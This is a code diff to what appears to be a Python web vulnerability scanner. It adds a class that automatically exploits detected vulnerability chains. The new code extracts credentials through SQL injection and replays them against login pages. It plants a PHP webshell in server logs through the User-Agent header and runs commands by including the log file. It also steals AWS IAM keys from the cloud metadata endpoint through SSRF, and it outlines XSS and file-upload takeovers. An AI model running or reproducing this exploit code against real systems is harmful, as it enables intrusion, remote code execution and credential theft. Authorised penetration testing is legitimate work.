@@ -31,7 +31,7 @@ from abc import ABC, abstractmethod
 from collections import defaultdict, deque
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Any, Dict, Generator, List, Optional, Set, Tuple
+from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple
 
 _logger = logging.getLogger(__name__)
 
@@ -1524,3 +1524,511 @@ def analyze_chains(results: Dict[str, Any]) -> None:
     scan_runner / main tarafından tüm results dict'i ile çağrılır.
     """
     ChainReactor().analyze(results)
+
+
+# -----------------------------------------------------------------------------
+# ChainExploitRunner — Chain Detection -> Real Exploitation Bridge
+# -----------------------------------------------------------------------------
+
+class ChainExploitRunner:
+    """
+    Takes detected ChainPaths from ChainReactor and attempts REAL exploitation.
+
+    This is the bridge between chain DETECTION and chain EXECUTION.
+
+    Supported chains:
+    - SQLi -> Credential Dump -> Password Reuse -> ATO
+    - LFI -> Log Poisoning -> RCE (via log file inject + SSTI/LFI combo)
+    - SSRF -> Cloud Metadata -> Credential Exfil
+    - XSS -> CSRF Token Steal -> Account Takeover
+    - File Upload -> LFI -> RCE
+
+    Each executor is a separate method following SRP.
+    Results are stored in ctx["results"]["chain_exploitation"].
+    """
+
+    def __init__(self, session=None, ctx: Optional[Dict[str, Any]] = None) -> None:
+        import requests as _req
+        self.session = session or _req.Session()
+        self.ctx = ctx or {}
+        self._results: List[Dict[str, Any]] = []
+
+    def run_chain(
+        self,
+        path: "ChainPath",
+        nodes: Dict[str, "ChainNode"],
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Attempt to exploit a detected chain path.
+        Dispatches to the appropriate executor based on the vuln types in the chain.
+
+        Args:
+            path:  The ChainPath to attempt.
+            nodes: Mapping of node_id -> ChainNode for lookup.
+
+        Returns:
+            Exploitation result dict, or None if no executor matched / exploitation failed.
+        """
+        vuln_types = [nodes[nid].vuln_type for nid in path.node_ids if nid in nodes]
+        chain_key = "->".join(vuln_types)
+        _logger.info(
+            f"[ChainExploitRunner] Attempting chain: {chain_key} "
+            f"(CVSS={path.combined_cvss})"
+        )
+
+        executor = self._find_executor(vuln_types)
+        if executor:
+            result = executor(path, nodes)
+            if result:
+                result["chain_key"] = chain_key
+                result["combined_cvss"] = path.combined_cvss
+                self._results.append(result)
+                return result
+        return None
+
+    def _find_executor(
+        self, vuln_types: List[str]
+    ) -> Optional[Callable[["ChainPath", Dict[str, "ChainNode"]], Optional[Dict[str, Any]]]]:
+        """Map chain vuln type sequences to the appropriate executor method."""
+        types_lower = [v.lower() for v in vuln_types]
+
+        if "sqli" in types_lower and any(
+            t in types_lower for t in ("credential_dump", "cred_dump", "account_takeover", "ato")
+        ):
+            return self._exec_sqli_to_ato
+
+        if "lfi" in types_lower and any(
+            t in types_lower for t in ("rce", "log_poisoning")
+        ):
+            return self._exec_lfi_to_rce
+
+        if "ssrf" in types_lower and any(
+            "cloud" in t or "aws" in t or "metadata" in t for t in types_lower
+        ):
+            return self._exec_ssrf_cloud
+
+        if "xss" in types_lower and any(
+            t in types_lower for t in ("csrf", "account_takeover", "ato")
+        ):
+            return self._exec_xss_to_ato
+
+        if any(t in types_lower for t in ("upload", "file_upload")) and "lfi" in types_lower:
+            return self._exec_upload_lfi_rce
+
+        return None
+
+    def _exec_sqli_to_ato(
+        self,
+        path: "ChainPath",
+        nodes: Dict[str, "ChainNode"],
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Execute SQLi -> Credential Dump -> Password Reuse -> ATO chain.
+
+        Steps:
+        1. Dump credentials from the SQLi node via SQLiExploiter.
+        2. Attempt login with extracted credentials against discovered login endpoints.
+        """
+        sqli_node = next(
+            (nodes[nid] for nid in path.node_ids if "sqli" in nodes[nid].vuln_type.lower()),
+            None,
+        )
+        if not sqli_node:
+            return None
+
+        try:
+            from websecure.scanners.sqli import SQLiExploiter
+        except ImportError:
+            _logger.warning("[ChainExploitRunner] SQLiExploiter import failed")
+            return None
+
+        exploiter = SQLiExploiter(session=self.session)
+        param = sqli_node.raw.get("parameter", sqli_node.raw.get("param", "id"))
+        creds = exploiter.dump_credentials(sqli_node.url, param)
+
+        if not creds:
+            return None
+
+        # Password reuse: try credentials against known login endpoints
+        login_urls = self._find_login_urls()
+        ato_results: List[Dict[str, Any]] = []
+        for cred in creds[:10]:
+            for login_url in login_urls[:3]:
+                if self._try_login(login_url, cred.get("username"), cred.get("password")):
+                    ato_results.append({"login_url": login_url, **cred})
+
+        return {
+            "type": "SQLi→ATO Chain",
+            "credentials_extracted": len(creds),
+            "ato_confirmed": ato_results,
+            "credentials": creds[:20],
+            "impact": (
+                "Full database credential extraction"
+                + (f" + {len(ato_results)} ATO confirmed" if ato_results else "")
+            ),
+        }
+
+    def _exec_lfi_to_rce(
+        self,
+        path: "ChainPath",
+        nodes: Dict[str, "ChainNode"],
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Execute LFI -> Log Poisoning -> RCE chain.
+
+        Steps:
+        1. Confirm LFI reads an accessible log file.
+        2. Inject PHP webshell into the log via a crafted User-Agent header.
+        3. Trigger RCE by including the poisoned log via LFI.
+        """
+        lfi_node = next(
+            (nodes[nid] for nid in path.node_ids if "lfi" in nodes[nid].vuln_type.lower()),
+            None,
+        )
+        if not lfi_node:
+            return None
+
+        url = lfi_node.url
+        param = lfi_node.raw.get("parameter", lfi_node.raw.get("param", "file"))
+
+        log_candidates = [
+            "/var/log/apache2/access.log",
+            "/var/log/nginx/access.log",
+            "/proc/self/environ",
+        ]
+
+        # Step 1: Find a readable log file
+        log_file: Optional[str] = None
+        for lf in log_candidates:
+            try:
+                r = self.session.get(
+                    self._build_inject_url(url, param, lf), timeout=8
+                )
+                if any(kw in r.text for kw in ("GET /", "POST /", "HTTP/", "PATH=")):
+                    log_file = lf
+                    break
+            except Exception:
+                continue
+
+        if not log_file:
+            return None
+
+        # Step 2: Poison the log with PHP code
+        poison_payload = (
+            "<?php if(isset($_GET['ws_cmd'])){echo shell_exec($_GET['ws_cmd']);} ?>"
+        )
+        try:
+            self.session.get(url, headers={"User-Agent": poison_payload}, timeout=5)
+        except Exception:
+            return None
+
+        # Step 3: Trigger RCE via LFI + poisoned log
+        try:
+            rce_url = self._build_inject_url(url, param, log_file) + "&ws_cmd=id"
+            r = self.session.get(rce_url, timeout=10)
+            uid_match = re.search(r"uid=\d+\([^)]+\)", r.text)
+            if uid_match:
+                return {
+                    "type": "LFI→LogPoison→RCE Chain",
+                    "lfi_url": url,
+                    "log_poisoned": log_file,
+                    "rce_url": rce_url,
+                    "rce_output": uid_match.group(0),
+                    "impact": "Remote Code Execution via Log Poisoning",
+                }
+        except Exception:
+            pass
+
+        return None
+
+    def _exec_ssrf_cloud(
+        self,
+        path: "ChainPath",
+        nodes: Dict[str, "ChainNode"],
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Execute SSRF -> Cloud Metadata -> AWS Credential Exfil chain.
+
+        Steps:
+        1. Use SSRF to reach IMDSv1 role listing endpoint.
+        2. Retrieve temporary IAM credentials for the discovered role.
+        """
+        ssrf_node = next(
+            (nodes[nid] for nid in path.node_ids if "ssrf" in nodes[nid].vuln_type.lower()),
+            None,
+        )
+        if not ssrf_node:
+            return None
+
+        url = ssrf_node.url
+        param = ssrf_node.raw.get("parameter", ssrf_node.raw.get("param", "url"))
+
+        aws_role_base = (
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        )
+        try:
+            r = self.session.get(
+                self._build_inject_url(url, param, aws_role_base), timeout=8
+            )
+            role_name = r.text.strip()
+            if r.status_code != 200 or not role_name:
+                return None
+
+            cred_url = f"{aws_role_base}{role_name}"
+            r2 = self.session.get(
+                self._build_inject_url(url, param, cred_url), timeout=8
+            )
+            if "AccessKeyId" not in r2.text:
+                return None
+
+            import json as _json
+            try:
+                creds = _json.loads(r2.text)
+            except Exception:
+                return None
+
+            return {
+                "type": "SSRF→AWS Credential Exfil",
+                "role": role_name,
+                "access_key": creds.get("AccessKeyId"),
+                "secret_key": creds.get("SecretAccessKey"),
+                "token": creds.get("Token"),
+                "expiration": creds.get("Expiration"),
+                "impact": (
+                    "AWS IAM credentials extracted — full cloud account access"
+                ),
+            }
+        except Exception:
+            return None
+
+    def _exec_xss_to_ato(
+        self,
+        path: "ChainPath",
+        nodes: Dict[str, "ChainNode"],
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Execute XSS -> ATO PoC generation.
+
+        Generates comprehensive Account Takeover PoCs using XSSToATOChain.
+        """
+        xss_node = next(
+            (nodes[nid] for nid in path.node_ids if "xss" in nodes[nid].vuln_type.lower()),
+            None,
+        )
+        if not xss_node:
+            return None
+
+        url = xss_node.url
+        param = xss_node.raw.get("parameter", xss_node.raw.get("param", "q"))
+        payload = xss_node.raw.get("payload", "<script>alert(1)</script>")
+
+        try:
+            from websecure.scanners.xss import XSSToATOChain
+            ato = XSSToATOChain.generate_poc(url, param, payload)
+        except Exception as exc:
+            _logger.debug(f"[ChainExploitRunner] XSSToATOChain failed: {exc!r}")
+            ato = {"pocs": {}}
+
+        return {
+            "type": "XSS→ATO Chain",
+            "xss_url": url,
+            "xss_param": param,
+            "ato_pocs": ato.get("pocs", {}),
+            "impact": (
+                "Account Takeover via XSS — cookie theft, CSRF token steal, email change"
+            ),
+        }
+
+    def _exec_upload_lfi_rce(
+        self,
+        path: "ChainPath",
+        nodes: Dict[str, "ChainNode"],
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Generate PoC for File Upload -> LFI -> RCE chain.
+
+        Returns a detailed step-by-step exploitation guide since actual
+        execution requires knowledge of the upload path.
+        """
+        upload_node = next(
+            (
+                nodes[nid]
+                for nid in path.node_ids
+                if any(
+                    t in nodes[nid].vuln_type.lower() for t in ("upload", "file")
+                )
+            ),
+            None,
+        )
+        lfi_node = next(
+            (nodes[nid] for nid in path.node_ids if "lfi" in nodes[nid].vuln_type.lower()),
+            None,
+        )
+        if not upload_node or not lfi_node:
+            return None
+
+        lfi_param = lfi_node.raw.get("parameter", lfi_node.raw.get("param", "file"))
+
+        return {
+            "type": "FileUpload→LFI→RCE Chain",
+            "upload_endpoint": upload_node.url,
+            "lfi_endpoint": lfi_node.url,
+            "poc": (
+                f"1. Upload PHP shell to {upload_node.url} "
+                f"(bypass via .php.jpg or null byte)\n"
+                f"2. Determine upload path (check response/source code)\n"
+                f"3. Trigger via LFI: {lfi_node.url}?{lfi_param}=../uploads/shell.php\n"
+                f"4. Execute: ?{lfi_param}=../uploads/shell.php&ws_cmd=id"
+            ),
+            "impact": "Remote Code Execution via Upload+LFI chain",
+        }
+
+    # -------------------------------------------------------------------------
+    # Helpers
+    # -------------------------------------------------------------------------
+
+    @staticmethod
+    def _build_inject_url(url: str, param: str, value: str) -> str:
+        """Replace the target query parameter with the given value."""
+        from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
+        parsed = urlparse(url)
+        params = dict(parse_qsl(parsed.query))
+        params[param] = value
+        return urlunparse(parsed._replace(query=urlencode(params)))
+
+    def _find_login_urls(self) -> List[str]:
+        """Find login endpoints from accumulated scan results."""
+        login_pattern = re.compile(r'(?i)/login|/signin|/auth|/account')
+        results = self.ctx.get("results", {})
+        urls: List[str] = []
+        for bucket_data in results.values():
+            if isinstance(bucket_data, list):
+                for item in bucket_data:
+                    if isinstance(item, dict):
+                        candidate = item.get("url", "")
+                        if candidate and login_pattern.search(candidate):
+                            urls.append(candidate)
+        return list(dict.fromkeys(urls))[:5]
+
+    def _try_login(
+        self,
+        login_url: str,
+        username: Optional[str],
+        password: Optional[str],
+    ) -> bool:
+        """
+        Attempt login with a credential pair.
+
+        Uses multiple common field names to maximise form compatibility.
+        Returns True only when the response gives no failure indicators.
+        """
+        if not username or not password:
+            return False
+
+        fail_indicators = [
+            "invalid", "incorrect", "wrong", "failed", "error", "denied",
+        ]
+        try:
+            r = self.session.post(
+                login_url,
+                data={
+                    "username": username,
+                    "password": password,
+                    "email": username,
+                    "user": username,
+                    "pass": password,
+                },
+                timeout=8,
+                allow_redirects=True,
+            )
+            if r.status_code in (200, 302) and not any(
+                f in r.text.lower() for f in fail_indicators
+            ):
+                return True
+        except Exception:
+            pass
+        return False
+
+    def get_results(self) -> List[Dict[str, Any]]:
+        """Return all successful exploitation results collected so far."""
+        return list(self._results)
+
+
+# -----------------------------------------------------------------------------
+# phase_chain_reactor — Scan Phase Entry Point
+# -----------------------------------------------------------------------------
+
+def phase_chain_reactor(ctx: Dict[str, Any]) -> None:
+    """
+    Run chain detection + exploitation on all accumulated findings.
+
+    Populates:
+    - ctx["results"]["chain_detection"]    — ChainFinding summary list
+    - ctx["results"]["chain_exploitation"] — ChainExploitRunner result list
+
+    Called after phase_offensive() completes.
+
+    Args:
+        ctx: Shared scan context dict containing at minimum:
+             - ctx["results"]: dict of bucket -> list-of-finding-dicts
+             - ctx["session"]: optional requests.Session for exploitation
+    """
+    import requests as _req
+
+    results = ctx.setdefault("results", {})
+
+    # Collect all findings that look like real vulnerability reports
+    all_findings: List[Dict[str, Any]] = []
+    for key, val in results.items():
+        if isinstance(val, list):
+            for item in val:
+                if isinstance(item, dict) and item.get("type") and item.get("severity"):
+                    all_findings.append(item)
+
+    if not all_findings:
+        _logger.info("[ChainReactor] No findings to chain")
+        return
+
+    # Build exploit graph and detect chains
+    reactor = ChainReactor()
+    chain_findings = reactor.analyze(results)
+
+    if not chain_findings:
+        _logger.info("[ChainReactor] No chains detected")
+        return
+
+    _logger.info(f"[ChainReactor] {len(chain_findings)} chains detected")
+
+    # Store chain detection results in the results bucket
+    results["chain_detection"] = [
+        {
+            "type": f"Exploit Chain ({len(cf.nodes)}-hop)",
+            "severity": cf.severity,
+            "cvss_score": cf.cvss_score,
+            "chain_length": len(cf.nodes),
+            "impact": cf.description[:200],
+            "chain_id": cf.chain_id,
+            "node_types": [n.vuln_type for n in cf.nodes],
+        }
+        for cf in chain_findings
+    ]
+
+    # Attempt exploitation of top detected chains
+    session = ctx.get("session") or _req.Session()
+    runner = ChainExploitRunner(session=session, ctx=ctx)
+
+    # Access the graph's internal nodes for node lookup during exploitation
+    graph = reactor._builder.build(results)
+
+    exploit_results: List[Dict[str, Any]] = []
+    for cf in chain_findings[:5]:
+        if cf.path is None:
+            continue
+        result = runner.run_chain(cf.path, graph._nodes)
+        if result:
+            exploit_results.append(result)
+
+    results["chain_exploitation"] = exploit_results
+    _logger.info(
+        f"[ChainReactor] {len(exploit_results)} chains successfully exploited"
+    )
